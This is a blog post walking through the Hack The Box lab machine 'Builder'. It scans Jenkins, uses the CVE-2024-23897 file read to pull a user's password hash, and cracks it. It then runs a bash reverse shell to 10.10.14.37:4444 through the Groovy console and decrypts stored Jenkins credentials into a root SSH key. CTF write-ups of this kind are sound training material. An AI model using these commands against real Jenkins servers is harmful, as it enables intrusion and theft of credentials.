---
layout: post
title: HTB - builder
date: 2025-03-04 18:42 -0400
---

{{ 'builder' | get_machine_avatar | raw }}

# jenkins
## nmap
```bash
~/workspace/projects/htb/builder » sudo nmap -p8080,22 -sC -sV $(cat ip.txt) --min-rate 1024
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-14 16:25 -04
Nmap scan report for builder.htb (10.10.11.10)
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```

## robots.txt
nothing

## subdomain bruteforce
nothing

## builder.htb
- Running jenkins version 2.441

![img](/assets/img/builder1.png)

- Vulnerable to [CVE-2024-23987](https://github.com/h4x0r-dz/CVE-2024-23897)
  - connect-node subcommand gives a full file read
  - help gives a partial file read

using the [jenkins docker image](https://hub.docker.com/layers/jenkins/jenkins/2.441/images/sha256-01e66c77a577d9c2b09e2e76ed6ef2508d341dc8fa713a272e351e113818d857) as reference we can find:
- default installation at `/var/jenkins_home`
- interesting files:
  - `/var/jenkins_home/users/users.xml`
    - has a list of all users
        - `users/jennifer_12108429903186576833/config.xml`
        - has user password hash
            - `$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`
  - `/var/jenkins_home/users/credentials.xml`
    - has all the credentials in encrypted form

cracking the hash gives the creds
- `jennifer:princess`

From here there are a lot of options.
I used jenkings cli to get a shell using groovy:

![img](/assets/img/builder2.png)

```bash
» java -jar jenkins-cli.jar -auth jennifer:princess -s http://builder.htb:8080/ groovysh
Groovy Shell (2.4.21, JVM: 17.0.9)
Type ':help' or ':h' for help.
-------------------------------------------------------------------------------
groovy:000> ['/bin/bash', '-c', 'bash -i >& /dev/tcp/10.10.14.37/4444 0>&1'].execute()
```

user flag:

```bash
jenkins@0f52c222a4cc:/$ cat ~/user.txt
cat ~/user.txt
64efe***************************
```

# root 1
`/.dockerenv` exists so probably running inside docker container:

Linpeas shows nothing interesting, probably a true jenkins challenge.

We can use pipelines with the ssh plugin to ssh to the host and get the root flag.

![img](/assets/img/builder3.png)
![img](/assets/img/builder5.png)

# root 2
A second way of solving this is by looking at the secret on /var/jenkins_home/credentials.xml and using groovy to [decrypt it](https://devops.stackexchange.com/questions/2191/how-to-decrypt-jenkins-passwords-from-credentials-xml):
```bash
Groovy Shell (2.4.21, JVM: 17.0.9)
Type ':help' or ':h' for help.
-------------------------------------------------------------------------------
groovy:000> println(hudson.util.Secret.decrypt("{secret}"))
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```
then just `ssh -i <PRIV KEY> root@172.17.0.1`

```bash
root@builder:~# cat /root/root.txt
76811***************************
```
